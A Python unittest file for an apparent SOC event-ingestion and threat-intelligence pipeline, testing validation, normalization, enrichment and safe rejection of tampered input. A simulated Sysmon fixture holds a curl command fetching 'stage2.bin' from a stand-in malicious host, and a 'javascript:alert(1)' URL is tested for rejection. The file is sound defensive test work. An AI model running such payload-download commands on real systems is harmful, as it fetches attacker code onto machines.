"""
AutoSOC Phase 1 (Day 12) - Security Foundation Contract & Integration Boundary Tests

Verifies:
  1. Security-event contracts (stable IDs, UTC timestamps, severity/port bounds,
     serialization round-trip, malformed/tampered input rejection without leakage)
  2. Threat-intelligence contracts (observable normalization/validation, provenance,
     confidence bounds, timestamp/freshness fields, protocol conformance)
  3. Cross-module integration boundaries (Ingestion validation -> Deterministic normalizer ->
     Deterministic enricher -> ThreatIntelObservablePipeline -> Query contract)
  4. Security verdict stability under infrastructure errors, malformed indicators,
     conflicting provider responses, and unrelated components
"""

import asyncio
import copy
import json
from pathlib import Path
import sys
import unittest

# Ensure backend root is on sys.path
backend_dir = Path(__file__).resolve().parent.parent
if str(backend_dir) not in sys.path:
    sys.path.insert(0, str(backend_dir))

from app.events.normalizer import DeterministicEventNormalizer  # noqa: E402
from app.events.protocols import (  # noqa: E402
    EventNormalizerProtocol,
    SourceParserProtocol,
)
from app.events.query_contract import (  # noqa: E402
    EXPLICITLY_FORBIDDEN_SEARCH_FIELDS,
    SEARCHABLE_NORMALIZED_EVENT_FIELDS,
    validate_normalized_event_query,
)
from app.events.schemas import (  # noqa: E402
    EventCategoryEnum,
    IngestionEnvelope,
    NormalizationStatusEnum,
    NormalizedSecurityEvent,
    SourceTypeEnum,
)
from app.events.validation import (  # noqa: E402
    InMemoryDuplicateTracker,
    IngestionDisposition,
    ValidationErrorCategory,
    compute_raw_hash,
    validate_ingestion_envelope,
)
from app.threat_intelligence import (  # noqa: E402
    DeterministicEventEnricher,
    EnrichmentStatusEnum,
    FixtureThreatIntelProvider,
    ObservableLookupRequest,
    ObservableTypeEnum,
    ObservableVerdictEnum,
    ProviderLookupStatusEnum,
    ThreatIntelObservablePipeline,
    ThreatIntelProviderProtocol,
    sanitize_provider_response,
    validate_observable_for_lookup,
)


def _make_envelope(
    *,
    source_type: str,
    raw_payload: str,
    ingestion_id: str = "11111111-1111-4111-8111-111111111111",
    sensor_id: str = "sensor-phase1-verify",
    ingest_time: str = "2026-11-28T10:00:00Z",
    raw_hash: str = None,
) -> dict:
    return {
        "ingestion_id": ingestion_id,
        "source_type": source_type,
        "sensor_id": sensor_id,
        "ingest_time": ingest_time,
        "raw_hash": raw_hash if raw_hash is not None else compute_raw_hash(raw_payload),
        "raw_payload": raw_payload,
    }


class TestSecurityEventContractsPhase1(unittest.TestCase):
    """Verify Day 5-8 security event schemas, validation, and serialization."""

    def test_valid_ingestion_normalization_and_serialization_roundtrip(self):
        raw_suricata = json.dumps(
            {
                "timestamp": "2026-11-28T09:59:58+0000",
                "event_type": "alert",
                "host": "edge-fw-01",
                "src_ip": "10.10.1.25",
                "src_port": 51234,
                "dest_ip": "203.0.113.99",
                "dest_port": 443,
                "proto": "TCP",
                "alert": {
                    "signature": "ET MALWARE Synthetic C2 Beacon",
                    "severity": 1,
                },
            }
        )
        envelope_payload = _make_envelope(
            source_type="suricata", raw_payload=raw_suricata
        )

        val_res = validate_ingestion_envelope(envelope_payload)
        self.assertTrue(val_res.valid)
        self.assertEqual(val_res.disposition, IngestionDisposition.ACCEPTED)
        self.assertIsNotNone(val_res.envelope)

        normalizer = DeterministicEventNormalizer()
        self.assertIsInstance(normalizer, EventNormalizerProtocol)
        self.assertIsInstance(normalizer._parser, SourceParserProtocol)

        norm_res = normalizer.normalize_envelope(envelope_payload)
        self.assertEqual(norm_res.normalization_status, NormalizationStatusEnum.NORMALIZED)
        self.assertIsNotNone(norm_res.event)

        event = norm_res.event
        self.assertEqual(event.ingestion_id, envelope_payload["ingestion_id"])
        self.assertNotEqual(event.event_id, event.ingestion_id)
        self.assertEqual(event.source, SourceTypeEnum.SURICATA)
        self.assertEqual(event.event_category, EventCategoryEnum.ALERT)
        self.assertEqual(event.event_type, "alert.ids")
        self.assertEqual(event.severity, 5)
        self.assertTrue(event.timestamp.endswith("Z"))

        # JSON serialization stability
        dumped = event.model_dump()
        serialized = json.dumps(dumped)
        rehydrated = NormalizedSecurityEvent(**json.loads(serialized))
        self.assertEqual(rehydrated.model_dump(), dumped)

    def test_malformed_and_tampered_envelopes_rejected_safely(self):
        secret_marker = "TOP_SECRET_CREDENTIAL_DO_NOT_LEAK"
        malformed_payload = json.dumps({"api_key": secret_marker})
        tampered = _make_envelope(
            source_type="suricata",
            raw_payload=malformed_payload,
            raw_hash="sha256:" + ("0" * 64),
        )
        res_hash = validate_ingestion_envelope(tampered)
        self.assertFalse(res_hash.valid)
        self.assertEqual(res_hash.disposition, IngestionDisposition.REJECTED)
        self.assertIn(ValidationErrorCategory.HASH_MISMATCH, {e.category for e in res_hash.errors})
        self.assertNotIn(secret_marker, json.dumps([e.model_dump() for e in res_hash.errors]))

        # Non-UTC naive timestamp and invalid UUID must be rejected
        bad_meta = _make_envelope(
            source_type="zeek",
            raw_payload='{"ts": 1732788000, "uid": "C1"}',
            ingestion_id="not-a-uuid-v4",
            ingest_time="2026-11-28T10:00:00",
        )
        res_bad = validate_ingestion_envelope(bad_meta)
        self.assertFalse(res_bad.valid)
        cats = {e.category for e in res_bad.errors}
        self.assertIn(ValidationErrorCategory.INVALID_IDENTIFIER, cats)
        self.assertIn(ValidationErrorCategory.INVALID_TIMESTAMP, cats)

        # Normalization rejects corrupted payload without crashing or returning fake event
        normalizer = DeterministicEventNormalizer()
        corrupt_env = _make_envelope(source_type="suricata", raw_payload="{broken json")
        norm_corrupt = normalizer.normalize_envelope(corrupt_env)
        self.assertEqual(norm_corrupt.normalization_status, NormalizationStatusEnum.FAILED)
        self.assertIsNone(norm_corrupt.event)

    def test_query_contract_excludes_raw_fields(self):
        self.assertNotIn("raw_payload", SEARCHABLE_NORMALIZED_EVENT_FIELDS)
        self.assertNotIn("raw_event", SEARCHABLE_NORMALIZED_EVENT_FIELDS)
        self.assertIn("raw_payload", EXPLICITLY_FORBIDDEN_SEARCH_FIELDS)

        valid_q = validate_normalized_event_query(
            {
                "source_type": "suricata",
                "normalization_status": "normalized",
                "severity": 5,
                "start_time": "2026-11-28T09:00:00+00:00",
                "end_time": "2026-11-28T11:00:00Z",
                "limit": 25,
                "offset": 0,
            }
        )
        self.assertTrue(valid_q.valid)
        self.assertEqual(valid_q.params.start_time, "2026-11-28T09:00:00.000Z")

        invalid_q = validate_normalized_event_query({"raw_payload": "anything"})
        self.assertFalse(invalid_q.valid)


class TestThreatIntelContractsPhase1(unittest.TestCase):
    """Verify Day 9-11 observable, provenance, freshness, and TI adapter contracts."""

    def test_observable_validation_normalization_and_protocol_conformance(self):
        provider = FixtureThreatIntelProvider()
        self.assertIsInstance(provider, ThreatIntelProviderProtocol)

        ok_ip, obs_type, norm_ip, err = validate_observable_for_lookup(
            "ip", " 2001:0db8:0000:0000:0000:0000:0000:0001 "
        )
        self.assertTrue(ok_ip)
        self.assertEqual(obs_type, ObservableTypeEnum.IP)
        self.assertEqual(norm_ip, "2001:db8::1")
        self.assertIsNone(err)

        ok_dom, obs_type_d, norm_dom, _ = validate_observable_for_lookup(
            "domain", "SUB.Example.Invalid."
        )
        self.assertTrue(ok_dom)
        self.assertEqual(obs_type_d, ObservableTypeEnum.DOMAIN)
        self.assertEqual(norm_dom, "sub.example.invalid")

        ok_url, _, _, bad_url_err = validate_observable_for_lookup("url", "javascript:alert(1)")
        self.assertFalse(ok_url)
        self.assertIsNotNone(bad_url_err)

        ok_hash, _, _, bad_hash_err = validate_observable_for_lookup("file_hash", "abc123")
        self.assertFalse(ok_hash)
        self.assertIsNotNone(bad_hash_err)

        lookup_ts = "2026-11-28T10:15:00.000Z"
        req = ObservableLookupRequest(
            observable_type=ObservableTypeEnum.IP,
            normalized_value="203.0.113.99",
        )
        res = provider.lookup(req, lookup_timestamp=lookup_ts)
        self.assertEqual(res.lookup_status, ProviderLookupStatusEnum.FOUND)
        self.assertEqual(res.verdict, ObservableVerdictEnum.MALICIOUS)
        self.assertGreaterEqual(res.confidence, 0.0)
        self.assertLessEqual(res.confidence, 1.0)
        self.assertEqual(res.lookup_timestamp, lookup_ts)
        self.assertGreater(len(res.references), 0)

    def test_end_to_end_pipeline_boundaries_and_verdict_preservation(self):
        raw_sysmon = json.dumps(
            {
                "EventID": 1,
                "UtcTime": "2026-11-28 10:05:00.000",
                "Computer": "WIN-END-01",
                "Image": "C:\\Windows\\System32\\curl.exe",
                "CommandLine": "curl.exe http://malicious-sim.example.invalid/stage2.bin",
                "Hashes": "SHA256=" + ("a" * 64),
            }
        )
        # Note: Sysmon UtcTime uses UTC format parsed by normalizer
        raw_zeek_dns = json.dumps(
            {
                "ts": 1732788300.0,
                "uid": "CZEEK123",
                "id.orig_h": "10.0.5.12",
                "id.resp_h": "203.0.113.99",
                "id.resp_p": 53,
                "proto": "udp",
                "query": "MALICIOUS-SIM.EXAMPLE.INVALID.",
            }
        )
        env = _make_envelope(
            source_type="zeek",
            raw_payload=raw_zeek_dns,
            ingestion_id="22222222-2222-4222-8222-222222222222",
        )

        # 1. Ingestion validation
        val = validate_ingestion_envelope(env)
        self.assertTrue(val.valid)

        # 2. Normalization (without mutating envelope)
        env_snapshot = copy.deepcopy(env)
        normalizer = DeterministicEventNormalizer()
        norm = normalizer.normalize_envelope(env)
        self.assertEqual(norm.normalization_status, NormalizationStatusEnum.NORMALIZED)
        self.assertEqual(env, env_snapshot)
        assert norm.event is not None

        # 3. Deterministic enrichment + TI adapter pipeline
        enrich_ts = "2026-11-28T10:06:00.000Z"
        event_snapshot = copy.deepcopy(norm.event.model_dump())
        pipeline = ThreatIntelObservablePipeline(
            base_enricher=DeterministicEventEnricher(),
            ti_providers=[FixtureThreatIntelProvider()],
        )
        enriched = pipeline.enrich_with_threat_intel(norm.event, enriched_at=enrich_ts)
        self.assertEqual(norm.event.model_dump(), event_snapshot)
        self.assertEqual(enriched.enrichment_status, EnrichmentStatusEnum.ENRICHED)
        self.assertEqual(enriched.enriched_at, enrich_ts)
        self.assertEqual(enriched.observable_count, 3)

        by_val = {o.normalized_value: o for o in enriched.observables}
        # Private source IP stays unknown; public fixture indicators get evidence-backed malicious verdict + top-level TI fields
        self.assertEqual(by_val["10.0.5.12"].verdict, ObservableVerdictEnum.UNKNOWN)
        self.assertEqual(by_val["203.0.113.99"].verdict, ObservableVerdictEnum.MALICIOUS)
        self.assertIsNotNone(by_val["203.0.113.99"].confidence)
        self.assertEqual(by_val["203.0.113.99"].lookup_status, "found")
        self.assertEqual(by_val["203.0.113.99"].lookup_timestamp, enrich_ts)
        self.assertIsNotNone(by_val["203.0.113.99"].evidence_summary)
        self.assertGreater(len(by_val["203.0.113.99"].references), 0)
        self.assertEqual(
            by_val["malicious-sim.example.invalid"].verdict,
            ObservableVerdictEnum.MALICIOUS,
        )

        # Duplicate tracker never alters enrichment verdicts
        tracker = InMemoryDuplicateTracker()
        is_dup_1, _ = asyncio.run(
            tracker.check_and_record(env["ingestion_id"], env["raw_hash"])
        )
        is_dup_2, dup_type = asyncio.run(
            tracker.check_and_record(
                "33333333-3333-4333-8333-333333333333", env["raw_hash"]
            )
        )
        self.assertFalse(is_dup_1)
        self.assertTrue(is_dup_2)
        self.assertEqual(dup_type, "raw_hash")

        # Sanitization strips any unexpected secret keys without promoting verdict improperly
        bad_verdict = sanitize_provider_response(
            {"verdict": "malicious", "evidence": {}, "references": []},
            provider_name="broken_feed",
            provider_version="0.1",
            observable_type=ObservableTypeEnum.IP,
            normalized_value="198.51.100.5",
            live_lookup_performed=False,
        )
        self.assertEqual(bad_verdict.verdict, ObservableVerdictEnum.UNKNOWN)
        self.assertEqual(bad_verdict.lookup_status, ProviderLookupStatusEnum.MALFORMED_RESPONSE)


if __name__ == "__main__":
    unittest.main()
